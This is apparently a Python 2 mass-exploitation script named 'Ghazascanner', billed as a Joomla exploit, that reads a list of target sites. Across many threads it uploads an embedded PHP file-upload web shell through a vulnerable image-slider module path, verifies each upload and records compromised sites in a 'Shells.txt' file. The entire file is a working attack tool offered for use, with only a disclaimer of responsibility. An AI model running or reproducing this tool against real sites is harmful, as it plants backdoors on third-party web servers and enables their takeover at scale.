# -*- coding: utf-8 -*
from __future__ import unicode_literals
#!/usr/bin/python
import requests, re, urllib2, os, sys, codecs, random               
from multiprocessing.dummy import Pool                          
from time import time as timer  
import time                     
from platform import system 
from colorama import Fore                               
from colorama import Style                              
from pprint import pprint                               
from colorama import init
from urlparse import urlparse
import warnings

from bs4 import BeautifulSoup
import subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
reload(sys)  
sys.setdefaultencoding('utf8')
init(autoreset=True)
fr  =   Fore.RED                                            
fc  =   Fore.CYAN                                            
fw  =   Fore.WHITE                                            
fg  =   Fore.GREEN                                            
sd  =   Style.DIM                                            
sn  =   Style.NORMAL                                        
sb  =   Style.BRIGHT 
shell = """<title>Ghazascanner</title><?php echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if( $_POST['_upl'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }else { echo '<b>Not uploaded ! </b><br><br>'; }}?>"""

def logo():
    curlear = "\x1b[0m"
    colors = [32]

    x = """

       _                                                        
      | |                                                       
  __ _| |__   __ _ ______ _ ___  ___ __ _ _ __  _ __   ___ _ __ 
 / _` | '_ \ / _` |_  / _` / __|/ __/ _` | '_ \| '_ \ / _ \ '__|
| (_| | | | | (_| |/ / (_| \__ \ (_| (_| | | | | | | |  __/ |   
 \__, |_| |_|\__,_/___\__,_|___/\___\__,_|_| |_|_| |_|\___|_|   
  __/ |\033[0;37;41m[Joomla Priv Exploit]\033[0;40m
 |___/                                                          

    \033[0;37;41m[ Coded by M4L1KL8590X ]
    \033[0;37;41m[ICQ:https://icq.im/greatzcode]
    \033[0;37;41m[Not responsible for any illegal usage of this tool.]
"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, curlear))
        time.sleep(0.05)
logo()
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
start_raw = raw_input("\n\033[91mGhazascanner\033[97m:~# \033[97m")
crownes = raw_input("\033[91mthread \033[97m\033[97m:~# \033[97m")
try:

    with codecs.open(start_raw, mode='r', encoding='ascii', errors='ignore') as f:
        lists = f.read().splitlines()
        lists = list((lists))
except:
    print("open your eyes!")

class Master:
    def unitrev(self, url):
        try:

            shell_name = str(time.time())[:-3]
            filenamex = "ghz_"+str(shell_name)+".php"

            jfiler = {'userfile' : (filenamex, shell), 'MAX_FILE_SIZE':'512000'}
            kencok =url +'/modules/mod_ariimageslidersa/mod_ariimageslidersa.php'
            c = requests.post(kencok, files=jfiler, timeout=10, verify=False, headers=Headers)
            meki = kencok.replace('mod_ariimageslidersa.php',filenamex)
            cek = requests.get(meki)
            if 'Ghazascanner' in cek.text:
                open('Shells.txt', 'a').write(meki +'\n')
                print '{}[>] {} {}   -  {}{}  0day  {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
                    
            else:
                print '{}[>] {} {}   - {}{}  0day  {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


        except Exception as e:
            print '{}[>] {} {}   - {}{}  0dayx {}{} Failed  '.format(sb, sd, str(url), fc,fc, sb,fr)

BotMaster = Master()

def Exploit(url):
    try:
        if 'http' not in url:
            site = 'http://'+url
            url = 'http://'+url
            BotMaster.unitrev(url)

        else:
            site = url
            BotMaster.unitrev(url)

    except:
        pass

def Main():
    try:
        pp = Pool(int(crownes))
        pr = pp.map(Exploit, lists)
    except:
        pass


if __name__ == '__main__':
    Main()
